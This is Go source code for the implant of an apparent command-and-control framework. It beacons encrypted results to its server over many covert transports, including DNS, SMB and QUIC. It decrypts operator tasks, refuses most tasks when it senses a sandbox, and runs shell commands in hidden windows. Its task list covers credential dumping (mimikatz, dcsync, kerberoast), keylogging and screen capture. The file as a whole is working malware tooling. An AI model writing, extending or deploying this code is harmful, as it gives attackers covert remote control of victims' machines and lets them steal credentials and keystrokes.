package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os/exec"
	"runtime"
	"strconv"
	"strings"

	"github.com/forgec2/forgec2/pkg/protocol"
)

// ensureResultID assigns a per-result unique id when the producer did not
// supply one (results generated outside the task worker, e.g. screenshots).
// ids are RFC 9562 UUIDv7 so they are time-ordered and sortable while staying
// unpredictable.
func ensureResultID(res *TaskResult) {
	if res.ResultID != "" {
		return
	}
	res.ResultID = protocol.UUIDv7()
}

func sendTaskResult(res TaskResult) {
	// Results keep a unique id for server-side idempotency: a result that is
	// re-queued after a dropped frame is resent with a new envelope seq, so
	// the server must dedupe on (task_id, rid) rather than the frame seq.
	ensureResultID(&res)
	// Quick results only make sense over an established session. Without one,
	// re-queue so the next regular beacon carries the result — a registration
	// or handshake frame cannot piggyback results.
	seqMu.Lock()
	ready := registered && !rekeyRequested
	seqMu.Unlock()
	if ecdhSess == nil || ecdhSess.needsHandshake() || !ready {
		enqueueResult(res)
		inFastMode.Store(true)
		return
	}

	req := BeaconRequest{
		UUID:            agentUUID,
		ProtocolVersion: CurrentProtocolVersion,
		Results:         []TaskResult{res},
	}
	body, _ := json.Marshal(req)
	// Encrypt with the session key so quick results never leak plaintext over
	// any transport (including DNS). If encryption fails, re-queue the result
	// rather than transmitting it in clear.
	sendBody, kind, _, ok := buildBeaconEnvelope(body)
	if !ok || kind != agentFrameEncrypted {
		enqueueResult(res)
		inFastMode.Store(true)
		return
	}
	var resp []byte
	curProto, curBT := getProtocol(), getBeaconTransport()
	switch {
	case curProto == "tcp":
		resp = sendTCPBeacon(sendBody)
	case curProto == "dns":
		resp = sendDNSBeacon(sendBody)
	case curProto == "smb" || curBT == "smb":
		resp = sendSMBBeacon(sendBody)
	case curBT == "wss":
		resp = sendWSSBeacon(sendBody)
	case curBT == "ssh" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "ssh://"):
		resp = sendSSHBeacon(sendBody)
	case curBT == "mtls" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "mtls://"):
		resp = sendMTLSBeacon(sendBody)
	case curBT == "h2c" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "h2c://"):
		resp = sendH2CBeacon(sendBody)
	case curBT == "grpc" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpc://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpcs://"):
		resp = sendGRPCBeacon(sendBody)
	case curProto == "quic" || curBT == "quic" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "quic://"):
		resp = sendQUICBeacon(sendBody)
	case curProto == "udp":
		resp = sendUDPBeacon(sendBody)
	default:
		resp = sendBeacon(sendBody)
	}
	if resp == nil {
		enqueueResult(res)
	}
}

func executeTask(task Task) TaskResult {
	res := TaskResult{
		TaskID: task.ID,
		Type:   task.Type,
	}

	// Decrypt payload if task is encrypted. The AAD binds each field to the
	// agent and task ID so ciphertext can't be replayed against other tasks.
	if task.Encrypted && ecdhSess != nil {
		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(uint64(task.ID), 10))
		if task.Command != "" {
			dec, err := ecdhSess.decryptAESGCMWithAAD(task.Command, aad)
			if err == nil {
				task.Command = string(dec)
			} else {
				res.Error = "task payload decryption failed"
				return res
			}
		}
		if task.Data != "" {
			dec, err := ecdhSess.decryptAESGCMWithAAD(task.Data, aad)
			if err == nil {
				task.Data = string(dec)
			} else {
				res.Error = "task payload decryption failed"
				return res
			}
		}
		// Shell is the interpreter for shell/ps (cmd.exe, /bin/sh) and a
		// secret for token_make. Older teamservers left the interpreter in
		// the clear; treat decrypt failure as plaintext unless this type
		// always encrypts Shell (token_make password).
		if task.Shell != "" {
			dec, err := ecdhSess.decryptAESGCMWithAAD(task.Shell, aad)
			if err == nil {
				task.Shell = string(dec)
			} else if task.Type == "token_make" {
				res.Error = "task payload decryption failed"
				return res
			}
		}
	}

	// In sandbox mode, only allow benign commands
	if inSandbox {
		safeCmds := map[string]bool{
			"ps": true, "ls": true, "shell": false, "beacon_now": true,
			"set_sleep": true, "exit": true, "terminate": true, "read": true,
		}
		if !safeCmds[task.Type] {
			res.Error = "sandbox mode: blocked by sandbox detection"
			return res
		}
	}

	// Check environment restrictions from ops profile
	if currentOpsProfile != nil {
		switch {
		case !currentOpsProfile.AllowShell && isShellTask(task.Type):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowInjection && isInjectTask(task.Type):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowCredDump && (task.Type == "mimikatz" || task.Type == "creds" || task.Type == "kerberoast" || task.Type == "lsa_bypass" || task.Type == "dcsync" || strings.HasPrefix(task.Type, "dpapi_")):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowKeylogger && (task.Type == "keylogger_start" || task.Type == "keylogger_dump"):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowScreenCapture && (task.Type == "screenshot" || task.Type == "screenshot_window" || task.Type == "screen_stream_start"):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		}
	}

	// Alias resolution happens before dispatch so results always carry the
	// canonical type (renderers and the timeline key off it). The AAD binding
	// covers agent UUID + task ID only, so rewriting Type here is safe.
	if canon, ok := protocol.ResolveAlias(task.Type); ok && canon != task.Type {
		task.Type = canon
		res.Type = canon
	}

	if handler, ok := taskHandlers[task.Type]; ok {
		handler(task, &res)
	} else {
		res.Error = "unknown task type: " + task.Type + " (send a \"help\" task for the command list)"
	}
	return res
}

func (lw *limitWriter) Write(p []byte) (int, error) {
	if lw.n >= lw.limit {
		lw.truncated = true
		return len(p), nil
	}
	remaining := lw.limit - lw.n
	if len(p) > remaining {
		p = p[:remaining]
		lw.truncated = true
	}
	n, err := lw.w.Write(p)
	lw.n += n
	return n, err
}

func runShell(cmdStr, shell string) (string, error) {
	ctx := currentExecCtx()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		if shell == "powershell.exe" || strings.Contains(strings.ToLower(shell), "powershell") {
			if !strings.Contains(cmdStr, "OutputEncoding") {
				cmdStr = "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $OutputEncoding = [System.Text.Encoding]::UTF8; " + cmdStr
			}
			cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
		} else {
			cmd = exec.CommandContext(ctx, "cmd.exe", "/C", "chcp 65001 >nul & "+cmdStr)
		}
		applyHideWindow(cmd)
	} else {
		// Linux / unix
		if shell == "" || shell == "bash" {
			cmd = exec.CommandContext(ctx, "bash", "-c", cmdStr)
		} else {
			cmd = exec.CommandContext(ctx, "sh", "-c", cmdStr)
		}
		setShellProcGroup(cmd)
	}

	var out bytes.Buffer
	lw := &limitWriter{w: &out, limit: maxOutputSize}
	cmd.Stdout = lw
	cmd.Stderr = lw
	err := cmd.Run()
	if err != nil && ctx.Err() != nil && cmd.Process != nil {
		// Task aborted or timed out: the context kill only terminates the
		// direct child. Tear down the rest of the tree so an orphaned
		// `sleep 3600` does not linger. taskkill runs with a fresh context so
		// it executes even though the task's own context is already cancelled.
		if runtime.GOOS == "windows" {
			_ = exec.Command("taskkill", "/F", "/T", "/PID", strconv.Itoa(cmd.Process.Pid)).Run()
		} else {
			killShellProcGroup(cmd)
		}
	}
	if lw.truncated {
		out.WriteString("\n[output truncated at 8MB]")
	}
	return decodeShellOutput(out.Bytes(), shell), err
}
